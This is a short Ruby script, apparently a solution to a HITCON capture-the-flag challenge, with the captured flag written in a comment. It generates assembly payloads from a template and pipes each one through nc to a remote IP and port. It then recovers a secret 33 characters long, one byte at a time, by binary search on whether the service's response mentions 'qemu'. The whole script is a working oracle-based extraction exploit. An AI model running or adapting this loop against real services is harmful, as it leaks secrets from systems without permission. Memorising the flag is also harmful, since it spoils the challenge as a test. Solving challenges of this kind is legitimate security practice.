#!/usr/bin/env ruby

# HITCON{HAve_FuN_4_NXTGen_P1at4|m}

tmpl = File.read('ty.S')

ans = ''

33.times{|i|
  u = 128
  l = 0

  while l + 1 != u
    c = (u + l) / 2
    puts "#{i}: #{l} #{c} #{u}"

    code = tmpl.sub(/#\d+\].*?\/\/ index/, "##{i}] // index")
    code = code.sub(/\d+\s+\/\/ value/, "#{c} // value")

    File.open('/tmp/ty.S', 'w') do |of|
      of.print(code)
    end

    if `ruby ty.rb /tmp/ty.S | nc 210.71.253.109 9123` =~ /qemu/
      l = c
    else
      u = c
    end
  end
  ans += u.chr
  puts ans
}
